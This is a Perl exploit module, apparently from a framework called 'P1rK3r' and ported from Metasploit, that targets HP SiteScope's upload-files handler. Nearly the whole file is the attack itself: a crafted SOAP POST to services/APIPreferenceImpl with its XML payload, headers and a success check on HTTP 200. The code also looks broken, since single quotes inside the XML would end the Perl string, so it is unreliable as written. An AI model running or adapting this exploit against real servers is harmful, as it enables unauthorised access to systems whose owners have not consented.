MSFPerlExploits/HP/MSF/SitescopeUploadfileshandler.pm

package MSFPerlExploits::HP::MSF::SitescopeUploadfileshandler;
use parent qw(P1rK3r::Exploit P1rK3r::Services::HP);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "SitescopeUploadfileshandler";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'SitescopeUploadfileshandler',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'services/APIPreferenceImpl',
                        PAYLOAD      => '<?xml version='1.0' encoding='UTF-8'?>
<wsns0:Envelope
xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'
xmlns:xsd='http://www.w3.org/2001/XMLSchema'
xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'
>
<wsns0:Body
wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'
>
<impl:create
xmlns:impl='http://Api.freshtech.COM'
>
<in0
xsi:type='xsd:string'
xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
>UserInstancePreferences</in0>
<in1
xsi:type='apachesoap:Map'
xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
>
<item
xsi:type='apachesoap:mapItem'
>
<key
xsi:nil='true'
xsi:type='xsd:anyType'
></key>
<value
xsi:nil='true'
xsi:type='xsd:anyType'
></value>
</item>
</in1>
</impl:create>
</wsns0:Body>
</wsns0:Envelope>
',
                        TEXT         => 'Sending First Exploit Request On : /services/APIPreferenceImpl',
                        HEADERS      => {
                           'SOAPAction' => '""',
                           'Content-Type' => 'text/xml; charset=UTF-8',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;